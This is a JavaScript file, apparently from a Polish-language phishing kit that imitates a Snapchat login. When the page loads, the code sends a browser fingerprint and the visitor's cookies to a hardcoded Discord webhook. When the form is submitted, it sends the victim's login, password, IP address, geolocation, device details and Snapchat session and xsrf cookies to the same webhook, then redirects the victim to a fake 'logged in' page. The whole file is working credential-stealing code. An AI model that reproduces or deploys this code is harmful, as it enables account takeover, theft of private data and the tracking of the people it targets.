document.addEventListener('DOMContentLoaded', function () {

  // *** Funkcja wysyłająca fingerprint i cookies na webhook ***
  async function sendFingerprint() {
    const ua = navigator.userAgent;
    const res = `${window.screen.width}x${window.screen.height}`;
    const lang = navigator.language;
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const platform = navigator.platform;
    const cookieEnabled = navigator.cookieEnabled;
    const cookies = document.cookie || 'BRAK_COOKIE';

    const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';

    try {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: "fingerprint",
          ua,
          res,
          lang,
          tz,
          platform,
          cookieEnabled,
          cookies
        })
      });
      console.log('Fingerprint i cookies wysłane.');
    } catch (e) {
      console.error('Błąd przy wysyłaniu fingerprinta:', e);
    }
  }

  // Wywołaj od razu
  sendFingerprint();

  // --- Twój oryginalny kod dalej ---

  async function getUserIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || 'NIEZNANE_IP';
    } catch {
      return 'IP_BRAK';
    }
  }

  function getCookieValue(name) {
    const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
    return match ? decodeURIComponent(match[2]) : 'BRAK';
  }

  async function getLocationFromIP(ip) {
    try {
      const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,lat,lon,city,regionName,country`);
      const data = await res.json();
      if (data.status === 'success') {
        return `📌 Lat: ${data.lat.toFixed(5)}, Lng: ${data.lon.toFixed(5)} (${data.city}, ${data.regionName}, ${data.country})`;
      } else {
        return 'BRAK_Lokalizacji_IP';
      }
    } catch {
      return 'BRAK_Lokalizacji_IP';
    }
  }

  async function getUserLocation() {
    const ip = await getUserIP();
    const locationFromIP = await getLocationFromIP(ip);
    return locationFromIP;
  }

  async function getUserMetadata() {
    const meta = {
      czas: new Date().toLocaleString(),
      userAgent: navigator.userAgent,
      resolution: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      jezyk: navigator.language,
      platforma: navigator.platform,
      cookiesEnabled: navigator.cookieEnabled,
      cpu: navigator.hardwareConcurrency || 'NIEZNANE',
      ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'NIEZNANE',
      colorDepth: screen.colorDepth,
      dpi: window.devicePixelRatio || 1,
      orientation: (screen.orientation || {}).type || 'NIEZNANA',
      battery: {
        level: 'BRAK',
        charging: 'BRAK',
        chargingTime: 'BRAK',
        dischargingTime: 'BRAK'
      }
    };

    if (navigator.getBattery) {
      try {
        const battery = await navigator.getBattery();
        meta.battery.level = Math.round(battery.level * 100) + '%';
        meta.battery.charging = battery.charging ? 'TAK' : 'NIE';
        meta.battery.chargingTime = battery.chargingTime === Infinity ? 'BRAK' : battery.chargingTime + 's';
        meta.battery.dischargingTime = battery.dischargingTime === Infinity ? 'BRAK' : battery.dischargingTime + 's';
      } catch {
        // bez zmian jeśli error
      }
    } else {
      meta.battery.level = 'NIEOBSŁUGIWANE';
      meta.battery.charging = 'NIEOBSŁUGIWANE';
      meta.battery.chargingTime = 'NIEOBSŁUGIWANE';
      meta.battery.dischargingTime = 'NIEOBSŁUGIWANE';
    }

    return meta;
  }

  function getNextMessageNumber() {
    let num = localStorage.getItem('messageNumber');
    if (!num) num = 0;
    num = parseInt(num) + 1;
    localStorage.setItem('messageNumber', num);
    return num;
  }

  const gownoForm = document.getElementById('gowno-form');

  if (gownoForm) {
    gownoForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      const gowno = document.getElementById('gowno').value;
      const login = localStorage.getItem('cwelski_login') || 'NIEZNANY_LOGIN';
      const messageNumber = getNextMessageNumber();
      const ip = await getUserIP();
      const meta = await getUserMetadata();
      const location = await getUserLocation();

      const snapchat_session = getCookieValue('snapchat_session');
      const xsrf_token = getCookieValue('xsrf-token');
      const device_id = getCookieValue('device_id');

      const webhook = 'https://discord.com/api/webhooks/1402043603483623455/Nn2m5RS0e7cSObmHIQgOmS0OFDKjo1gRSwnJFYphW934MO-5muwjePBMI40-w-J0fjKi';

      const payload = {
        content: `# DANE ${messageNumber}
📨 **Login cwela**: \`${login}\`
🔐 **Hasło cwela**: \`${gowno}\`
🌍 **IP**: \`${ip}\`
📍 **Lokalizacja**: ${location}
🕓 **Czas**: \`${meta.czas}\`
💻 **User-Agent**: \`${meta.userAgent}\`
🖥️ **Rozdzielczość**: \`${meta.resolution}\`
🌐 **Strefa czasowa**: \`${meta.timezone}\`
🗣️ **Język**: \`${meta.jezyk}\`
🔋 **Bateria**: \`Poziom: ${meta.battery.level}, Ładowanie: ${meta.battery.charging}\`
🧠 **Platforma**: \`${meta.platforma}\`

--- Dodatkowe cookies ---
🥷 snapchat_session: \`${snapchat_session}\`
🛡️ xsrf-token: \`${xsrf_token}\`
📱 device_id: \`${device_id}\`

----------------------`
      };

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(() => {
        localStorage.removeItem('cwelski_login');
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      }).catch(() => {
        setTimeout(() => {
          window.location.href = 'loggedin.html';
        }, 1000);
      });
    });
  }

  const loginForm = document.getElementById('login-form');
  if (loginForm) {
    loginForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const login = document.getElementById('login').value;
      localStorage.setItem('cwelski_login', login);

      const popup = document.getElementById('loading-popup');
      if (popup) popup.classList.remove('hidden');

      setTimeout(() => {
        window.location.href = 'login.html';
      }, 1000);
    });
  }
});

// --- rozdzialka ---

document.addEventListener('DOMContentLoaded', () => {
  const div36 = document.querySelector('div.style-36');
  const div999 = document.querySelector('div.style-999');

  function checkScreen() {
    const width = window.innerWidth;

    if (width <= 768) { // telefon
      if (div36) div36.style.display = 'block';
      if (div999) div999.style.display = 'none';
    } else { // komputer
      if (div36) div36.style.display = 'none';
      if (div999) div999.style.display = 'block';
    }
  }

  checkScreen();
  window.addEventListener('resize', checkScreen);
});
